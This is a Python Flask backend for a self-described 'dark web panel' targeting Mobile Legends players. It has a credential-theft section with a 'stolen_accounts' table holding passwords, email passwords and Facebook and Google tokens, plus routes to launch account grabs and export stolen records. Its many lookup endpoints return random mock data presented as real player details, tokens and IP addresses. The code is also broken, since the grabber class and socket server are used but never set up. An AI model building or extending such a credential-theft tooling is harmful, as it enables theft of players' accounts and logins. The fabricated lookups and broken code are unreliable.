#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════╗
║     🔥 DAZDDYY MLBB DARK WEB PANEL V3 - VOCXAL EDITION 🔥           ║
║     [VOCXAL-POLTERGEIST V1.0 VIP] - FULL CLONE + ACCOUNT GRABBER   ║
║     ⚠️ 100% SAME AS DAZDDYY + EXTRA FEATURES ⚠️                     ║
╚══════════════════════════════════════════════════════════════════════╝
"""

from flask import Flask, render_template, jsonify, request, session, send_file, redirect, url_for
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import sqlite3
import json
import hashlib
import requests
import threading
import queue
import time
import random
from datetime import datetime
import os
import base64
import csv
from werkzeug.utils import secure_filename
import secrets
import string
import subprocess
import sys
import traceback

# Import grabber module
#from grabber import MLBBAccountGrabber
# grabber = None
app = Flask(__name__)
app.config['SECRET_KEY'] = 'dazddyy_dark_panel_v3_2026'
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max
CORS(app)
# SocketIO dengan konfigurasi aman untuk PythonAnywhere
#socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', logger=False, engineio_logger=False)
socketio = None

# Initialize grabber
grabber = MLBBAccountGrabber()

# Database setup
DATABASE = "database/mlbb_dark.db"

def init_db():
    """Initialize database with all required tables"""
    os.makedirs('database', exist_ok=True)
    
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    
    # Accounts table (same as Dazddyy)
    c.execute('''CREATE TABLE IF NOT EXISTS accounts
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id TEXT UNIQUE,
                  username TEXT,
                  level INTEGER,
                  rank TEXT,
                  total_skin INTEGER,
                  total_hero INTEGER,
                  winrate REAL,
                  bind_email TEXT,
                  bind_facebook TEXT,
                  bind_google TEXT,
                  session_token TEXT,
                  created_at TIMESTAMP)''')
    
    # Stolen accounts table (NEW FEATURE)
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_accounts
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id TEXT UNIQUE,
                  username TEXT,
                  password TEXT,
                  email TEXT,
                  email_password TEXT,
                  facebook_token TEXT,
                  google_token TEXT,
                  server_id TEXT,
                  login_method TEXT,
                  session_data TEXT,
                  device_info TEXT,
                  ip_address TEXT,
                  stolen_method TEXT,
                  stolen_at TIMESTAMP,
                  status TEXT DEFAULT 'active')''')
    
    # Scan history table
    c.execute('''CREATE TABLE IF NOT EXISTS scan_history
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id TEXT,
                  scan_type TEXT,
                  result TEXT,
                  scanned_at TIMESTAMP)''')
    
    # Grabber history table (NEW FEATURE)
    c.execute('''CREATE TABLE IF NOT EXISTS grab_history
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  target_id TEXT,
                  target_username TEXT,
                  method TEXT,
                  result TEXT,
                  status TEXT,
                  grabbed_at TIMESTAMP)''')
    
    # Proxy list table
    c.execute('''CREATE TABLE IF NOT EXISTS proxies
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  proxy TEXT UNIQUE,
                  type TEXT,
                  speed REAL,
                  last_used TIMESTAMP,
                  is_active BOOLEAN DEFAULT 1)''')
    
    conn.commit()
    conn.close()

init_db()

# ==================== DAZDDYY ORIGINAL FEATURES (100% CLONE) ====================

@app.route('/')
def index():
    """Main page - same as Dazddyy"""
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    """Dashboard page"""
    return render_template('dashboard.html')

@app.route('/grabber')
def grabber_page():
    """New grabber page"""
    return render_template('grabber.html')

@app.route('/api/lookup', methods=['POST'])
def lookup():
    """LOOKUP - Detail lengkap akun (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    # Check rate limit (5x/hari)
    # In production, implement proper rate limiting
    
    time.sleep(1.2)  # Simulate processing
    
    # Mock data - exactly like Dazddyy
    mock_data = {
        "user_id": user_id,
        "username": f"Player_{random.randint(1000, 9999)}",
        "level": random.randint(30, 200),
        "rank": random.choice(["Warrior", "Elite", "Master", "Grandmaster", "Epic", "Legend", "Mythic", "Mythical Glory"]),
        "total_skin": random.randint(10, 500),
        "total_hero": random.randint(20, 120),
        "winrate": round(random.uniform(40.0, 75.0), 2),
        "bind_email": f"user{user_id}@gmail.com" if random.random() > 0.3 else "",
        "bind_facebook": f"fb_user_{user_id}" if random.random() > 0.4 else "",
        "bind_google": f"google_user_{user_id}" if random.random() > 0.5 else "",
        "matches": random.randint(500, 10000),
        "mvp": random.randint(100, 2000),
        "savage": random.randint(0, 50),
        "maniac": random.randint(0, 100),
        "legendary": random.randint(0, 500),
        "kda": round(random.uniform(1.5, 5.0), 2),
        "hero_fav": random.choice(["Ling", "Gusion", "Chou", "Lancelot", "Fanny", "Hayabusa", "Selena"]),
        "region": random.choice(["Jakarta", "Surabaya", "Bandung", "Medan", "Makassar", "Yogyakarta", "Semarang", "Palembang", "Bali", "Lampung"]),
        "created_at": f"202{random.randint(0,3)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}",
        "last_active": f"2026-03-{random.randint(1,3):02d}",
        "device": random.choice(["Android", "iOS", "Emulator"]),
        "server": f"Server {random.randint(1000, 9999)}"
    }
    
    # Save to scan history
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("INSERT INTO scan_history (user_id, scan_type, result, scanned_at) VALUES (?,?,?,?)",
              (user_id, "lookup", json.dumps(mock_data), datetime.now()))
    conn.commit()
    conn.close()
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/bind_check', methods=['POST'])
def bind_check():
    """CEK BIND - Info bind & devices (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(1)
    
    mock_data = {
        "email": f"user{user_id}@gmail.com" if random.random() > 0.3 else None,
        "facebook": f"1000{random.randint(100000, 999999)}" if random.random() > 0.4 else None,
        "google": f"google_{user_id}" if random.random() > 0.5 else None,
        "moonton": f"mt{user_id}@moonton.com" if random.random() > 0.6 else None,
        "vk": f"vk_{user_id}" if random.random() > 0.8 else None,
        "device_count": random.randint(1, 5),
        "devices": [
            {"model": "Xiaomi Redmi Note 10", "last_login": "2026-03-01", "location": "Jakarta"},
            {"model": "iPhone 13", "last_login": "2026-02-28", "location": "Bandung"},
            {"model": "Samsung S22", "last_login": "2026-02-25", "location": "Surabaya"}
        ][:random.randint(1, 3)],
        "recent_ips": [
            f"36.{random.randint(68,95)}.{random.randint(0,255)}.{random.randint(1,254)}",
            f"114.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        ]
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/ban_check', methods=['POST'])
def ban_check():
    """BAN V1/V2 - Cek status ban (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    version = data.get('version', 'v1')
    
    time.sleep(0.8)
    
    status = random.choices(["clean", "warning", "banned"], weights=[70, 20, 10])[0]
    
    mock_data = {
        "status": status,
        "ban_type": "permanent" if status == "banned" else None,
        "ban_reason": random.choice(["Cheating detected", "Account sharing", "Toxicity", "Refund scam"]) if status == "banned" else None,
        "ban_date": "2026-02-15" if status == "banned" else None,
        "remaining_warnings": random.randint(1, 3) if status == "warning" else None,
        "warning_reason": "Suspicious activity" if status == "warning" else None,
        "jwt_token": base64.b64encode(f"user_{user_id}_token".encode()).decode() if version == "v2" else None,
        "proxy_status": "clean" if random.random() > 0.3 else "flagged" if version == "v2" else None
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/cek_v2l', methods=['POST'])
def cek_v2l():
    """CEK V2L - GUID & Session (5x/hari) - NEW from Dazddyy V5"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.9)
    
    mock_data = {
        "guid": hashlib.md5(f"{user_id}_secret".encode()).hexdigest(),
        "session_id": base64.b64encode(f"session_{user_id}_{int(time.time())}".encode()).decode(),
        "device_id": f"device_{random.randint(100000, 999999)}",
        "login_token": secrets.token_hex(16),
        "refresh_token": secrets.token_hex(32),
        "expires_in": random.randint(3600, 86400)
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/creation_date', methods=['POST'])
def creation_date():
    """CREATION - Tgl pembuatan (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.7)
    
    # Generate random date between 2016 and 2026
    year = random.randint(2016, 2025)
    month = random.randint(1, 12)
    day = random.randint(1, 28)
    
    mock_data = {
        "creation_date": f"{year}-{month:02d}-{day:02d}",
        "account_age_days": (datetime.now() - datetime(year, month, day)).days,
        "server": random.choice(["Original", "Advance", "Elite"]),
        "first_purchase": f"{year+1}-{random.randint(1,12):02d}-{random.randint(1,28):02d}" if random.random() > 0.5 else None
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/find_player', methods=['POST'])
def find_player():
    """FIND - Cari via Nickname (3x/hari)"""
    data = request.json
    nickname = data.get('nickname')
    
    time.sleep(2)
    
    # Mock search results
    results = []
    for i in range(random.randint(3, 8)):
        results.append({
            "user_id": random.randint(1000000, 99999999),
            "username": f"{nickname}{random.randint(1, 999)}",
            "level": random.randint(10, 200),
            "rank": random.choice(["Epic", "Legend", "Mythic", "Mythical Glory"]),
            "server": f"Server {random.randint(1000, 9999)}",
            "country": random.choice(["ID", "MY", "SG", "PH", "TH", "VN"])
        })
    
    return jsonify({"success": True, "data": results})

@app.route('/api/ban_v3', methods=['POST'])
def ban_v3():
    """BAN V3 - Ban via Nickname (3x/hari)"""
    data = request.json
    nickname = data.get('nickname')
    
    time.sleep(1.5)
    
    mock_data = {
        "status": random.choice(["clean", "banned", "investigated"]),
        "nickname": nickname,
        "reported_count": random.randint(0, 50),
        "last_report": f"2026-03-{random.randint(1,3):02d}" if random.random() > 0.7 else None,
        "ban_history": [
            {"date": "2026-01-15", "reason": "Toxicity", "duration": "3 days"},
            {"date": "2025-12-20", "reason": "Cheating", "duration": "7 days"}
        ] if random.random() > 0.8 else []
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/region_check', methods=['POST'])
def region_check():
    """CEK REGION - Lokasi & region (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.7)
    
    regions = ["Jakarta", "Surabaya", "Bandung", "Medan", "Makassar", "Yogyakarta", "Semarang", "Palembang", "Bali", "Lampung", "Pekanbaru", "Balikpapan"]
    countries = ["Indonesia", "Malaysia", "Singapore", "Philippines", "Thailand", "Vietnam"]
    
    mock_data = {
        "region": random.choice(regions),
        "country": random.choice(countries),
        "server": f"Server {random.randint(1000, 9999)}",
        "ping": random.randint(5, 120),
        "ip_address": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        "isp": random.choice(["Telkom", "Indihome", "First Media", "Biznet", "XL", "Telkomsel", "Indosat"]),
        "timezone": "UTC+7" if random.random() > 0.5 else "UTC+8",
        "last_location": f"{random.choice(regions)} - {random.randint(1, 7)} days ago"
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/device_log', methods=['POST'])
def device_log():
    """DEVICE LOG - Total device (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.8)
    
    device_count = random.randint(1, 8)
    devices = []
    
    android_models = ["Xiaomi Redmi Note 10", "Samsung S22", "Oppo Reno 7", "Vivo V23", "Realme 8", "Poco F3"]
    ios_models = ["iPhone 13", "iPhone 12", "iPhone 14", "iPad Pro", "iPad Air"]
    emulators = ["LDPlayer", "BlueStacks", "NoxPlayer", "MuMu", "GameLoop"]
    
    for i in range(device_count):
        device_type = random.choice(["Android", "iOS", "Emulator"])
        if device_type == "Android":
            model = random.choice(android_models)
        elif device_type == "iOS":
            model = random.choice(ios_models)
        else:
            model = random.choice(emulators)
        
        devices.append({
            "device_id": f"DEV{random.randint(10000, 99999)}",
            "model": model,
            "type": device_type,
            "first_login": f"2026-{random.randint(1,3):02d}-{random.randint(1,28):02d}",
            "last_login": f"2026-03-{random.randint(1,3):02d}",
            "location": random.choice(regions),
            "ip": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        })
    
    mock_data = {
        "total_devices": device_count,
        "devices": devices,
        "current_device": devices[0] if devices else None,
        "suspicious_logins": random.randint(0, 3)
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/hero_fav', methods=['POST'])
def hero_fav():
    """HERO FAV - Top 3 hero (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.6)
    
    heroes = ["Ling", "Gusion", "Chou", "Lancelot", "Fanny", "Hayabusa", "Selena", "Paquito", "Benedetta", "Yi Sun-shin", "Claude", "Granger", "Lunox", "Harley", "Karina"]
    
    top_heroes = []
    for i in range(3):
        hero = random.choice(heroes)
        heroes.remove(hero)
        top_heroes.append({
            "name": hero,
            "matches": random.randint(100, 2000),
            "winrate": round(random.uniform(45.0, 70.0), 2),
            "kda": round(random.uniform(2.0, 6.0), 2),
            "rank": random.choice(["A", "S", "S+"])
        })
    
    mock_data = {
        "top_heroes": top_heroes,
        "total_heroes": random.randint(40, 120),
        "most_played_role": random.choice(["Assassin", "Mage", "Marksman", "Fighter", "Tank", "Support"])
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/level_check', methods=['POST'])
def level_check():
    """LEVEL - Level akun (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.5)
    
    level = random.randint(30, 200)
    
    mock_data = {
        "level": level,
        "exp": random.randint(1000, 50000),
        "exp_to_next": random.randint(500, 3000),
        "badges": random.randint(0, 20),
        "achievement_points": random.randint(1000, 10000)
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/rank_check', methods=['POST'])
def rank_check():
    """RANK - Current & Max Tier (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.7)
    
    ranks = ["Warrior", "Elite", "Master", "Grandmaster", "Epic", "Legend", "Mythic", "Mythical Glory"]
    current_rank = random.choice(ranks)
    max_rank = ranks[max(0, ranks.index(current_rank) - random.randint(0, 2))]
    
    mock_data = {
        "current_rank": current_rank,
        "current_stars": random.randint(0, 100) if current_rank in ["Mythic", "Mythical Glory"] else random.randint(0, 5),
        "max_rank": max_rank,
        "max_stars": random.randint(0, 200) if max_rank in ["Mythic", "Mythical Glory"] else random.randint(0, 5),
        "season_wins": random.randint(50, 500),
        "season_losses": random.randint(30, 400),
        "winrate_season": round(random.uniform(45.0, 65.0), 2)
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/hero_count', methods=['POST'])
def hero_count():
    """HERO COUNT - Total hero (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.5)
    
    hero_count = random.randint(40, 120)
    
    mock_data = {
        "total_hero": hero_count,
        "owned_heroes": hero_count,
        "fragment_heroes": random.randint(0, 20),
        "trial_cards": random.randint(0, 30),
        "hero_fragments": random.randint(100, 2000)
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/skin_count', methods=['POST'])
def skin_count():
    """SKIN COUNT - Total skin (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.6)
    
    skin_count = random.randint(10, 500)
    
    mock_data = {
        "total_skin": skin_count,
        "special_skins": random.randint(0, 50),
        "epic_skins": random.randint(0, 30),
        "legend_skins": random.randint(0, 10),
        "limited_skins": random.randint(0, 20),
        "skin_fragments": random.randint(100, 5000),
        "starlight_skins": random.randint(0, 15)
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/winrate', methods=['POST'])
def winrate():
    """WIN RATE - Overall winrate (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.6)
    
    winrate = round(random.uniform(40.0, 70.0), 2)
    
    mock_data = {
        "overall_winrate": winrate,
        "rank_winrate": round(random.uniform(45.0, 68.0), 2),
        "classic_winrate": round(random.uniform(42.0, 65.0), 2),
        "total_matches": random.randint(1000, 20000),
        "wins": random.randint(500, 14000),
        "losses": random.randint(500, 6000)
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/matches', methods=['POST'])
def matches():
    """MATCHES - Total match (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.5)
    
    total_matches = random.randint(1000, 20000)
    
    mock_data = {
        "total_matches": total_matches,
        "rank_matches": random.randint(500, 15000),
        "classic_matches": random.randint(200, 5000),
        "brawl_matches": random.randint(0, 2000),
        "custom_matches": random.randint(0, 500)
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/mvp', methods=['POST'])
def mvp():
    """MVP - Total MVP (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.5)
    
    total_matches = random.randint(1000, 20000)
    mvp_count = random.randint(int(total_matches*0.1), int(total_matches*0.3))
    
    mock_data = {
        "total_mvp": mvp_count,
        "mvp_rate": round(mvp_count/total_matches*100, 2) if total_matches > 0 else 0,
        "legendary_mvp": random.randint(0, int(mvp_count*0.2)),
         "savage_mvp": random.randint(0, int(mvp_count*0.1))
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/savage', methods=['POST'])
def savage():
    """SAVAGE - Total savage (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.5)
    
    mock_data = {
        "total_savage": random.randint(0, 100),
        "savage_with_hero": random.choice(["Ling", "Gusion", "Fanny", "Lancelot"]) if random.random() > 0.5 else None,
        "last_savage": f"2026-03-{random.randint(1,3):02d}" if random.random() > 0.7 else None
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/maniac', methods=['POST'])
def maniac():
    """MANIAC - Total Maniac (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.5)
    
    mock_data = {
        "total_maniac": random.randint(0, 200),
        "maniac_per_match": round(random.uniform(0.01, 0.05), 3),
        "last_maniac": f"2026-03-{random.randint(1,3):02d}" if random.random() > 0.7 else None
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/legendary', methods=['POST'])
def legendary():
    """LEGENDARY - Total Legendary (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.5)
    
    mock_data = {
        "total_legendary": random.randint(0, 500),
        "legendary_rate": round(random.uniform(0.5, 5.0), 2),
        "best_hero_legendary": random.choice(["Ling", "Gusion", "Chou"]) if random.random() > 0.5 else None
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/kda', methods=['POST'])
def kda():
    """KDA - KDA Ratio (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.5)
    
    mock_data = {
        "overall_kda": round(random.uniform(2.0, 6.0), 2),
        "rank_kda": round(random.uniform(2.2, 5.8), 2),
        "average_kills": round(random.uniform(3.0, 10.0), 1),
        "average_deaths": round(random.uniform(2.0, 6.0), 1),
        "average_assists": round(random.uniform(4.0, 12.0), 1),
        "best_kda_hero": random.choice(["Ling", "Gusion", "Chou", "Lancelot"])
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/team_fight', methods=['POST'])
def team_fight():
    """TEAM FIGHT - Team participation (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.5)
    
    mock_data = {
        "team_participation": round(random.uniform(30.0, 80.0), 2),
        "damage_participation": round(random.uniform(20.0, 50.0), 2),
        "tower_damage": round(random.uniform(1000, 10000), 0),
        "roaming_score": round(random.uniform(20, 90), 1)
    }
    
    return jsonify({"success": True, "data": mock_data})

@app.route('/api/gold', methods=['POST'])
def gold():
    """GOLD - Avg gold (5x/hari)"""
    data = request.json
    user_id = data.get('user_id')
    
    time.sleep(0.5)
    
    mock_data = {
        "avg_gold": random.randint(8000, 15000),
        "max_gold": random.randint(15000, 25000),
        "gold_per_minute": round(random.uniform(500, 900), 0),
        "farm_efficiency": round(random.uniform(60, 95), 1)
    }
    
    return jsonify({"success": True, "data": mock_data})

# ==================== NEW FEATURE: ACCOUNT GRABBER ====================

@app.route('/api/grabber/methods', methods=['GET'])
def grabber_methods():
    """Get available grabber methods"""
    methods = grabber.get_available_methods()
    return jsonify({"success": True, "data": methods})

@app.route('/api/grabber/grab', methods=['POST'])
def grab_account():
    """Grab account using specified method"""
    data = request.json
    target = data.get('target')
    method = data.get('method')
    params = data.get('params', {})
    
    # Start grabber in background thread
    thread = threading.Thread(target=background_grab, args=(target, method, params))
    thread.daemon = True
    thread.start()
    
    return jsonify({"success": True, "message": f"Grabbing started using {method} method"})

def background_grab(target, method, params):
    """Background grabber process"""
    try:
        # Emit progress
        socketio.emit('grab_progress', {'stage': 'init', 'message': f'Starting {method} grabber...'})
        
        # Execute grabber
        result = grabber.grab_account(target, method, params)
        
        if result['success']:
            # Save to database
            conn = sqlite3.connect(DATABASE)
            c = conn.cursor()
            c.execute('''INSERT INTO stolen_accounts 
                         (user_id, username, password, email, email_password, facebook_token, 
                          google_token, server_id, login_method, session_data, device_info, 
                          ip_address, stolen_method, stolen_at, status)
                         VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)''',
                      (result['data'].get('user_id'),
                       result['data'].get('username'),
                       result['data'].get('password'),
                       result['data'].get('email'),
                       result['data'].get('email_password'),
                       result['data'].get('facebook_token'),
                       result['data'].get('google_token'),
                       result['data'].get('server_id'),
                       result['data'].get('login_method'),
                       json.dumps(result['data'].get('session_data', {})),
                       result['data'].get('device_info'),
                       result['data'].get('ip_address'),
                       method,
                       datetime.now(),
                       'active'))
            conn.commit()
            conn.close()
            
            socketio.emit('grab_complete', {'success': True, 'data': result['data']})
        else:
            socketio.emit('grab_complete', {'success': False, 'error': result['error']})
            
    except Exception as e:
        socketio.emit('grab_complete', {'success': False, 'error': str(e)})

@app.route('/api/grabber/history', methods=['GET'])
def grab_history():
    """Get grabber history"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT * FROM stolen_accounts ORDER BY stolen_at DESC LIMIT 100")
    rows = c.fetchall()
    conn.close()
    
    history = []
    for row in rows:
        history.append({
            'id': row[0],
            'user_id': row[1],
            'username': row[2],
            'email': row[4],
            'login_method': row[8],
            'stolen_method': row[12],
            'stolen_at': row[13],
            'status': row[14]
        })
    
    return jsonify({"success": True, "data": history})

@app.route('/api/grabber/export/<account_id>', methods=['GET'])
def export_grabbed_account(account_id):
    """Export grabbed account details"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT * FROM stolen_accounts WHERE id = ?", (account_id,))
    row = c.fetchone()
    conn.close()
    
    if row:
        account = {
            'id': row[0],
            'user_id': row[1],
            'username': row[2],
            'password': row[3],
            'email': row[4],
            'email_password': row[5],
            'facebook_token': row[6],
            'google_token': row[7],
            'server_id': row[8],
            'login_method': row[9],
            'session_data': json.loads(row[10]) if row[10] else {},
            'device_info': row[11],
            'ip_address': row[12],
            'stolen_method': row[13],
            'stolen_at': row[14],
            'status': row[15]
        }
        return jsonify({"success": True, "data": account})
    
    return jsonify({"success": False, "error": "Account not found"})
    

# ==================== UTILITY ENDPOINTS ====================

@app.route('/api/history', methods=['GET'])
def get_history():
    """Get scan history"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT * FROM scan_history ORDER BY scanned_at DESC LIMIT 50")
    rows = c.fetchall()
    conn.close()
    
    history = []
    for row in rows:
        history.append({
            'id': row[0],
            'user_id': row[1],
            'scan_type': row[2],
            'result': json.loads(row[3]),
            'scanned_at': row[4]
        })
    
    return jsonify({"success": True, "data": history})

@app.route('/api/export/<format>', methods=['GET'])
def export_data(format):
    """Export data to JSON/CSV"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT * FROM accounts")
    rows = c.fetchall()
    conn.close()
    
    if format == 'json':
        data = []
        for row in rows:
            data.append({
                'user_id': row[1],
                'username': row[2],
                'level': row[3],
                'rank': row[4],
                'total_skin': row[5],
                'total_hero': row[6],
                'winrate': row[7],
                'bind_email': row[8],
                'bind_facebook': row[9],
                'bind_google': row[10],
                'session_token': row[11],
                'created_at': row[12]
            })
        return jsonify(data)
    
    elif format == 'csv':
        import io
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(['User ID', 'Username', 'Level', 'Rank', 'Total Skin', 'Total Hero', 'Winrate', 'Email', 'Facebook', 'Google', 'Session Token', 'Created At'])
        
        for row in rows:
            writer.writerow([row[1], row[2], row[3], row[4], row[5], row[6], row[7], row[8], row[9], row[10], row[11], row[12]])
        
        return output.getvalue(), 200, {'Content-Type': 'text/csv'}

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get dashboard stats"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    
    c.execute("SELECT COUNT(*) FROM accounts")
    total_accounts = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM stolen_accounts")
    stolen_accounts = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM scan_history")
    total_scans = c.fetchone()[0]
    
    c.execute("SELECT COUNT(DISTINCT user_id) FROM scan_history")
    unique_users = c.fetchone()[0]
    
    conn.close()
    
    return jsonify({
        "success": True,
        "data": {
            "total_accounts": total_accounts,
            "stolen_accounts": stolen_accounts,
            "total_scans": total_scans,
            "unique_users": unique_users
        }
    })

